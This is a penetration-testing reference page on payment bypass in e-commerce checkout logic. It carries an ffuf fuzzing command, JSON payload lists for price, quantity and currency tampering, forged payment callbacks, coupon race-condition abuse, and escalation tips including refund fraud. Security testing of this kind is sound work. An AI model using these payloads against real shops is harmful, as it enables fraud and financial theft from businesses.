# Payment Bypass (Business Logic Flaws)

> **Summary**: Exploitation of flaws in payment and checkout logic to manipulate prices, skip payment steps, abuse discounts, or complete transactions without proper payment.
> **Impact**: Financial loss for the business, free products/services, fraudulent transactions, subscription abuse.
> **Typical Severity**: High | Critical

---

## Detection

### Indicators
- Price values transmitted in client-side parameters (hidden fields, cookies, API requests)
- Checkout flow with multiple sequential steps that can be skipped
- Discount/coupon codes validated client-side or without proper server-side checks
- Quantity, price, or currency fields modifiable in intercepted requests
- Success/failure status determined by client-side callbacks or URL parameters
- Payment gateway callbacks that can be forged or replayed

### Automated Detection
```bash
# Intercept all checkout requests and identify price-related parameters
# Look for: price, amount, total, quantity, currency, discount, coupon, status, success, callback

# Fuzz price parameter with boundary values
ffuf -u "https://<TARGET>/api/checkout" -X POST \
  -d '{"item_id":"1","price":"FUZZ","quantity":"1"}' \
  -H "Content-Type: application/json" \
  -w <PRICE_WORDLIST>

# Price wordlist values: 0, -1, 0.01, 0.001, 99999999, -99999999, null, NaN, Infinity
```

### Manual Detection
1. Map the entire checkout flow from cart to payment confirmation
2. Intercept each step and identify all parameters (price, quantity, currency, discount, status)
3. Check if price is sent from the client rather than computed server-side
4. Look for callback URLs, success parameters, or referrer-based payment verification
5. Test if steps can be skipped by directly requesting later stages of the flow

---

## Exploitation

### Prerequisites
- Application has an e-commerce or payment processing workflow
- Some payment-related values are transmitted client-side or can be intercepted
- Insufficient server-side validation of price, quantity, or checkout state

### Step-by-Step

1. **Map the checkout flow** -- identify every request from "add to cart" through "order confirmed"
   - Success: complete request sequence documented with all parameters
2. **Modify price parameter** -- change the price value in the intercepted request
   - Success: order is processed at the modified (lower) price
3. **Manipulate quantity** -- set quantity to negative, zero, or fractional values
   - Success: negative quantity creates a credit; zero quantity results in free item
4. **Skip payment step** -- jump directly from cart to order confirmation
   - Success: order is placed without completing payment
5. **Tamper with callback/status** -- modify success/failure indicators in the payment response
   - Success: application treats a failed payment as successful
6. **Abuse discount codes** -- reuse codes, apply multiple codes, or race condition on single-use codes
   - Success: discount applied multiple times or beyond intended limits

### Payloads

#### Price Manipulation
```
# Original request
{"item_id": "123", "price": 99.99, "quantity": 1}

# Set price to zero
{"item_id": "123", "price": 0, "quantity": 1}

# Set price to negative (may credit the account)
{"item_id": "123", "price": -99.99, "quantity": 1}

# Fractional penny
{"item_id": "123", "price": 0.001, "quantity": 1}

# Integer overflow
{"item_id": "123", "price": 99999999999999, "quantity": 1}

# Scientific notation
{"item_id": "123", "price": 1e-10, "quantity": 1}

# String type confusion
{"item_id": "123", "price": "0", "quantity": 1}
{"item_id": "123", "price": null, "quantity": 1}
```

#### Quantity Manipulation
```
# Negative quantity (may result in refund/credit)
{"item_id": "123", "price": 99.99, "quantity": -1}

# Zero quantity
{"item_id": "123", "price": 99.99, "quantity": 0}

# Fractional quantity
{"item_id": "123", "price": 99.99, "quantity": 0.01}

# Add expensive item with negative quantity + cheap item with positive
{"items": [
  {"id": "expensive_item", "quantity": -1},
  {"id": "cheap_item", "quantity": 1}
]}
```

#### Currency Manipulation
```
# Change currency to a weaker one
{"price": 99.99, "currency": "IDR"}  # Indonesian Rupiah
{"price": 99.99, "currency": "VND"}  # Vietnamese Dong

# Remove currency parameter
{"price": 99.99}

# Invalid currency code
{"price": 99.99, "currency": "XXX"}
```

#### Checkout Flow Bypass
```
# Skip payment step - go directly to confirmation
GET /checkout/confirm?order_id=<ORDER_ID>&status=success

# Tamper with payment callback
POST /payment/callback
{"order_id": "<ORDER_ID>", "status": "success", "amount": 0}

# Modify success URL parameters
/checkout/complete?payment_status=approved&transaction_id=<FAKE_TX_ID>

# Change referrer to payment gateway
Referer: https://payment-gateway.com/success
```

#### Coupon / Discount Abuse
```
# Apply same coupon multiple times (race condition)
# Send 20 concurrent requests applying the same single-use coupon
# See race-conditions.md for tooling

# Test coupon with modified case
DISCOUNT50 / discount50 / Discount50

# Stacking multiple coupons
coupon[]=CODE1&coupon[]=CODE2&coupon[]=CODE3

# Apply coupon after price is already 0
# Apply coupon to items not intended for discount
```

### Proof of Concept
1. Add an item to cart (e.g., $99.99 laptop stand)
2. Proceed to checkout and intercept the payment request in Burp Suite
3. Modify the `price` parameter from `99.99` to `0.01`
4. Forward the modified request
5. If order confirmation shows $0.01 total -- payment bypass confirmed

---

## Bypasses

- **Race conditions**: submit multiple concurrent requests for single-use discounts (see [race-conditions.md](race-conditions.md))
- **Parameter pollution**: send price in both body and query string
- **Type juggling**: send price as string, null, boolean, array, or object
- **Alternate endpoints**: use mobile API or legacy API that may lack validation
- **Webhook forgery**: craft a fake payment gateway webhook notification
- **Session manipulation**: modify session/cookie values storing cart totals
- **IDOR on orders**: access or modify another user's order (see [idor.md](idor.md))
- **Mass assignment**: add unexpected fields like `is_paid`, `discount_amount`, `total` (see [mass-assignment.md](mass-assignment.md))

---

## Escalation

- **Account credit abuse**: negative-price items generate store credit for unlimited purchases
- **Subscription manipulation**: modify subscription tier, duration, or price parameters
- **Gift card abuse**: generate or manipulate gift card values
- **Refund fraud**: process refunds for manipulated orders to extract real money
- **Race condition on purchases**: buy limited-stock items by racing the stock check (see [race-conditions.md](race-conditions.md))
- **IDOR on payment status**: change payment status of other users' orders (see [idor.md](idor.md))

---

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite | Intercept and modify checkout requests, test parameter tampering |
| Turbo Intruder | Race condition testing on coupon codes and checkout flows |
| Postman | Craft and replay payment API requests |
| mitmproxy | Intercept mobile app payment flows |
| curl | Script checkout flow requests for automation |

---

## References

- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/
- https://book.hacktricks.xyz/pentesting-web/bypass-payment-process
- https://portswigger.net/web-security/logic-flaws
- [race-conditions.md](race-conditions.md) | [idor.md](idor.md) | [mass-assignment.md](mass-assignment.md)
